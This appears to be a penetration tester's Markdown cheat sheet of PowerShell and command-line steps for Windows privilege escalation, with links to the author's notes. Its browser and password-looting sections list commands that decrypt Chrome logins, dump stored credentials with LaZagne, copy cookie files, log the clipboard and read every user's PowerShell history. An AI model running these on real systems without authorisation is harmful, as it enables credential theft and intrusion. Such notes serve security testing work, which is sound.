# System Information
```powershell
systeminfo

Get-HotFix | ft -AutoSize

wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%

Get-ChildItem Env: | ft Key,Value
```

# User and Group Enumeration
```powershell
whoami /all
SeDebugPrivilege
SeTcbPrivilege
SeImpersonatePrivilege
SeLoadDriverPrivilege
SeBackupPrivilege
SeTakeOwnershipPrivilege

Get-LocalUser | ft Name,Enabled,LastLogon

Get-LocalGroup | ft Name

nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName
```

# Always Install Elevated
```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
[Always Install Elevated](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Privilege%20Escalation/Windows/23-Miscellanous%20Technique.md)

# Network Enumeration
```powershell
net share
powershell Find-DomainShare -ComputerDomain domain.local

reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```
[Network Hunting](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Privilege%20Escalation/Windows/03-Network%20Enumeration.md)

# Permissions
```powershell
.\SharpUp.exe audit

Get-CimInstance Win32_Service | Where-Object {$_.StartMode -eq "Auto" -and $_.PathName -notlike '"*' -and $_.PathName -like '* *' -and $_.PathName -notlike '*C:\Windows\*'} | Select-Object Name, PathName

accesschk.exe /accepteula -kvuqsw "Users" hklm\System\CurrentControlSet\services
accesschk.exe /accepteula "<CURRENT_USERNAME>" -kvuqsw hklm\System\CurrentControlSet\services

Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User | Format-List
```
[Weak Permissions](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Privilege%20Escalation/Windows/14-Weak%20Permissions.md)

# Programs and Services
```powershell
Get-WmiObject -Class Win32_Product |  select Name, Version

Get-Process -Id (Get-NetTCPConnection -LocalPort 8080).OwningProcess | Select-Object Id, ProcessName, Description, Path

Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
[Programs and Services Privilege Escalation](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Privilege%20Escalation/Windows/06-Process%20Enumeration.md)
[Vulnerable Services](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Privilege%20Escalation/Windows/16-Vulnerable%20Service.md)

# Kernel Exploits
```powershell
systeminfo > systeminfo.txt

python3 wes.py systeminfo.txt > exploits

cat exploits | grep CVE > exploit_CVE
cat exploit_CVE | awk '{print $2}' > exploit_CVEs.txt

awk '{print "search cve:" $0 " type:exploit"}' exploit_CVEs.txt > msf_search.rc

msfconsole -q -r msf_search.rc | grep -E "exploit/windows/local/" --color=always

# Sherlock
Set-ExecutionPolicy bypass -Scope process
Import-Module .\Sherlock.ps1
Find-AllVulns
```
[Kenel Exploits](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Privilege%20Escalation/Windows/15-Kernel%20Exploit.md)
[Sherlock](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Privilege%20Escalation/Windows/24-Windows%20Server.md)

# Browser and Saved Credentials
```powershell
.\SharpChrome.exe logins /unprotect

copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
Invoke-SharpChromium -Command "cookies slack.com"

.\lazagne.exe all

Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01

https://github.com/dafthack/MailSniper

cp C:\Users\<Sizin_İstifadəçi_Adınız>\AppData\Roaming\Mozilla\Firefox\Profiles\<təsadüfi_simvollar>.default-release\cookies.sqlite C:\Users\Public\

Invoke-ClipboardLogger
```


# Looting Password
```powershell
# Application Configuration Files
Get-ChildItem -Recurse -Include *.txt, *.ini, *.cfg, *.config, *.xml -ErrorAction SilentlyContinue | Select-String -Pattern "password" | Select-Object Path, LineNumber, Line | Out-GridView

# SAM SECURITY SYSTEM NTDS
icacls C:\Windows\System32\config\SAM
icacls C:\Windows\System32\config\SECURITY
icacls C:\Windows\NTDS\ntds.dit
icacls C:\Windows\System32\config\SYSTEM
icacls C:\Windows\System32\config\*

# Key Manager
rundll32 keymgr,KRShowKeyMgr

# Powershell History
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

# Sticky Notes
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

# Passwords in unattend.xml
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul

# Passwords Manager
Get-ChildItem -Path C:\ -Include *.kdbx, *.opvault, *CyberArk* -Recurse -ErrorAction SilentlyContinue | Select-Object FullName

# Windows Autologon
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object AutoAdminLogon, DefaultUserName, DefaultPassword

# Cmdkey Saved Credentials
cmdkey /list
```
[Check All Critical Files](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Privilege%20Escalation/Windows/05-Looting%20for%20Password.md#sticky-notes)

# LLMNR and NBNS Poisining
[NTLMnet Hash](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Privilege%20Escalation/Windows/21-Network%20Credentials.md)
